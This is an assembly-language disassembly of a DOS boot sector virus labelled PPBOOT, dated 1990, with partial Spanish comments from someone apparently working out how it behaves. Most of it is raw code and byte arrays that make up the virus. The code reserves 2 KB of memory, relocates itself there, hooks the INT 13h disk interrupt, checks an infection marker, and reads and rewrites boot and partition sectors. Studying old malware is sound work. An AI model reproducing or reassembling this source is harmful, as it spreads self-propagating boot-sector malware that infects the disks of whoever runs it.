


PAGE  60,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             PPBOOT                                   ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   15-Mar-90                                            ÛÛ
;ÛÛ      Code type: zero start                                           ÛÛ
;ÛÛ      Passes:    5          Analysis Flags on: H                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e         equ     7C0Dh                   ; (8F68:7C0D=0)
data_2e         equ     7C0Eh                   ; (8F68:7C0E=0)
data_3e         equ     7C13h                   ; (8F68:7C13=0)
data_4e         equ     7C18h                   ; (8F68:7C18=0)
data_5e         equ     7C1Ah                   ; (8F68:7C1A=0)
data_6e         equ     7C1Ch                   ; (8F68:7C1C=0)
data_7e         equ     7DF3h                   ; (8F68:7DF3=0)
data_8e         equ     7DF5h                   ; (8F68:7DF5=0)
data_9e         equ     7DF7h                   ; (8F68:7DF7=0)
data_10e        equ     7DF8h                   ; (8F68:7DF8=0)
data_11e        equ     7EB2h                   ; (8F68:7EB2=0)
data_12e        equ     800Bh                   ; (8F68:800B=0)
data_13e        equ     800Dh                   ; (8F68:800D=0)
data_14e        equ     800Eh                   ; (8F68:800E=0)
data_15e        equ     8010h                   ; (8F68:8010=0)
data_16e        equ     8011h                   ; (8F68:8011=0)
data_17e        equ     8016h                   ; (8F68:8016=0)
data_18e        equ     81F5h                   ; (8F68:81F5=0)
data_19e        equ     81F9h                   ; (8F68:81F9=0)
data_20e        equ     81FBh                   ; (8F68:81FB=0)
data_21e        equ     81FCh                   ; (8F68:81FC=0)

seg_a           segment
                assume  cs:seg_a, ds:seg_a


                org     0

ppboot          proc    far

start:
;*              jmp     short loc_2             ;*(001E)
                db      0EBh, 1Ch
                db      90h
                db      'IBM  3.2'
                db      0, 2, 2, 1, 0, 2
                db      70h, 0, 0D0h, 2, 0FDh, 2
                db      0, 9, 0, 2, 0, 0
                db      0
loc_2:
                xor     ax,ax                   ; Zero register
                mov     ss,ax    ; ss = 0
                mov     sp,7C00h ; 0:7C00h es donde se carga el boot sector
                mov     ds,ax    ; ds = 0
                mov     ax,word ptr ds:[413h]
                ; (0000:0413=280h) ; Memoria = 640k

                sub     ax,2
                ; baja la memoria total disponible para el sistema en 2k

                mov     word ptr ds:[413h],ax   ; (0000:0413=280h)
                ; Memoria = 638k

                mov     cl,6
                shl     ax,cl
                ; (Shift w/zeros fill) multiplica memoria disp. en k por 64
                ; convierte a memoria disp. en paragraph

                sub     ax,7C0h
                ; le resta 7C0h = poco menos de 2k -> ¨Lugar para copiarse?

                mov     es,ax  ; apunta es al lugar elegido
                mov     si,7C00h
                ; inicio del boot record en memoria

                mov     di,si
                mov     cx,100h
                ; mueve 100h words. Se supone que hacia adelante
                ; Se autocopia lo m s adelante que puede.

                rep     movsw      ; Rep while cx>0 Mov [si] to es:[di]

                db      8Eh, 0C8h
              ; mov cs, ax ; OPERACION PROHIBIDA!!!
                                   ; te¢ricamente tendr¡a que saltar a ax:ip
                                   ; -> inicio lugar de copiado + ip (ip = 43?)
                                   ; lo que hace es saltar de segmento,
                                   ; pero no de offset.

                db      0Eh, 1Fh, 0E8h, 0
                db      0, 32h, 0E4h, 0CDh, 13h, 80h
                db      26h, 0F8h, 7Dh, 80h, 8Bh, 1Eh
                db      0F9h, 7Dh, 0Eh, 58h, 2Dh, 20h
                db      0, 8Eh, 0C0h, 0E8h, 3Ch, 0
                db      8Bh, 1Eh, 0F9h, 7Dh, 43h, 0B8h
                db      0C0h, 0FFh, 8Eh, 0C0h, 0E8h, 2Fh
                db      0, 33h, 0C0h, 0A2h, 0F7h, 7Dh
                db      8Eh, 0D8h, 0A1h, 4Ch, 0, 8Bh
                db      1Eh, 4Eh, 0, 0C7h, 6, 4Ch
                db      0, 0D0h, 7Ch, 8Ch, 0Eh, 4Eh
                db      0, 0Eh, 1Fh, 0A3h, 2Ah, 7Dh
                db      89h, 1Eh, 2Ch, 7Dh, 8Ah, 16h
                db      0F8h, 7Dh, 0EAh, 0, 7Ch, 0
                db      0, 0B8h, 1, 3, 0EBh, 3

ppboot          endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near
                mov     ax,201h
                xchg    ax,bx
                add     ax,ds:data_6e           ; (8F68:7C1C=0)
                xor     dx,dx                   ; Zero register
                div     word ptr ds:data_4e     ; (8F68:7C18=0) ax,dxrem=dx:ax/data
                inc     dl
                mov     ch,dl
                xor     dx,dx                   ; Zero register
                div     word ptr ds:data_5e     ; (8F68:7C1A=0) ax,dxrem=dx:ax/data
                mov     cl,6
                shl     ah,cl                   ; Shift w/zeros fill
                or      ah,ch
                mov     cx,ax
                xchg    ch,cl
                mov     dh,dl
                mov     ax,bx

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_2:
                mov     dl,ds:data_10e          ; (8F68:7DF8=0)
                mov     bx,8000h
                int     13h                     ; Disk  dl=drive a: ah=func 02h
                                                ;  read sectors to memory es:bx
                jnc     loc_ret_3               ; Jump if carry=0
                pop     ax

loc_ret_3:
                retn
sub_1           endp

                db      1Eh, 6, 50h, 53h, 51h, 52h
                db      0Eh, 1Fh, 0Eh, 7, 0F6h, 6
                db      0F7h, 7Dh, 1, 75h, 42h, 80h
                db      0FCh, 2, 75h, 3Dh, 38h, 16h
                db      0F8h, 7Dh, 88h, 16h, 0F8h, 7Dh
                db      75h, 22h, 32h, 0E4h, 0CDh, 1Ah
                db      0F6h, 0C6h, 7Fh, 75h, 0Ah, 0F6h
                db      0C2h, 0F0h, 75h, 5, 52h, 0E8h
                db      0B1h, 1, 5Ah, 8Bh, 0CAh, 2Bh
                db      16h, 0B0h, 7Eh, 89h, 0Eh, 0B0h
                db      7Eh, 83h, 0EAh, 24h, 72h, 11h
                db      80h, 0Eh, 0F7h, 7Dh, 1, 56h
                db      57h, 0E8h, 12h, 0, 5Fh, 5Eh
                db      80h, 26h, 0F7h, 7Dh, 0FEh
loc_4:
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     es
                pop     ds
;*              jmp     far ptr loc_13          ;*(F000:EC59)
                db      0EAh, 59h, 0ECh, 0, 0F0h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3           proc    near
                mov     ax,201h
                mov     dh,0
                mov     cx,1
                call    sub_2                   ; (00C3)
                test    byte ptr ds:data_10e,80h        ; (8F68:7DF8=0)
                jz      loc_7                   ; Jump if zero
                mov     si,81BEh
                mov     cx,4

locloop_5:
                cmp     byte ptr [si+4],1
                je      loc_6                   ; Jump if equal
                cmp     byte ptr [si+4],4
                je      loc_6                   ; Jump if equal
                add     si,10h
                loop    locloop_5               ; Loop if cx > 0

                retn
loc_6:
                mov     dx,[si]
                mov     cx,[si+2]
                mov     ax,201h
                call    sub_2                   ; (00C3)
loc_7:
                mov     si,8002h
                mov     di,7C02h
                mov     cx,1Ch
                rep     movsb                   ; Rep while cx>0 Mov [si] to es:[di]
                cmp     word ptr ds:data_21e,1357h      ; (8F68:81FC=0)
                jne     loc_9                   ; Jump if not equal
                cmp     byte ptr ds:data_20e,0  ; (8F68:81FB=0)
                jae     loc_ret_8               ; Jump if above or =
                mov     ax,ds:data_18e          ; (8F68:81F5=0)
                mov     ds:data_8e,ax           ; (8F68:7DF5=0)
                mov     si,ds:data_19e          ; (8F68:81F9=0)
;*              jmp     loc_12                  ;*(0292)
                db      0E9h, 8, 1

loc_ret_8:
                retn
loc_9:
                cmp     word ptr ds:data_12e,200h       ; (8F68:800B=0)
                jne     loc_ret_8               ; Jump if not equal
                cmp     byte ptr ds:data_13e,2  ; (8F68:800D=0)
                jb      loc_ret_8               ; Jump if below
                mov     cx,ds:data_14e          ; (8F68:800E=0)
                mov     al,ds:data_15e          ; (8F68:8010=0)
                cbw                             ; Convrt byte to word
                mul     word ptr ds:data_17e    ; (8F68:8016=0) ax = data * ax
                add     cx,ax
                mov     ax,20h
                mul     word ptr ds:data_16e    ; (8F68:8011=0) ax = data * ax
                add     ax,1FFh
                mov     bx,200h
                div     bx                      ; ax,dx rem=dx:ax/reg
                add     cx,ax
                mov     ds:data_8e,cx           ; (8F68:7DF5=0)
                mov     ax,ds:data_3e           ; (8F68:7C13=0)
                sub     ax,ds:data_8e           ; (8F68:7DF5=0)
                mov     bl,ds:data_1e           ; (8F68:7C0D=0)
                xor     dx,dx                   ; Zero register
                xor     bh,bh                   ; Zero register
                div     bx                      ; ax,dx rem=dx:ax/reg
                inc     ax
                mov     di,ax
                and     byte ptr ds:data_9e,0FBh        ; (8F68:7DF7=0)
                cmp     ax,0FF0h
                jbe     loc_10                  ; Jump if below or =
                or      byte ptr ds:data_9e,4   ; (8F68:7DF7=0)
loc_10:
                mov     si,1
                mov     bx,ds:data_2e           ; (8F68:7C0E=0)
                dec     bx
                mov     ds:data_7e,bx           ; (8F68:7DF3=0)
                mov     byte ptr ds:data_11e,0FEh       ; (8F68:7EB2=0)
;*              jmp     short loc_11            ;*(0200)
sub_3           endp

                db      0EBh, 0Dh
                db      1, 0, 0Ch, 0, 1, 0
                db      0AAh, 2, 0, 57h, 13h, 55h
                db      0AAh

seg_a           ends



                end     start

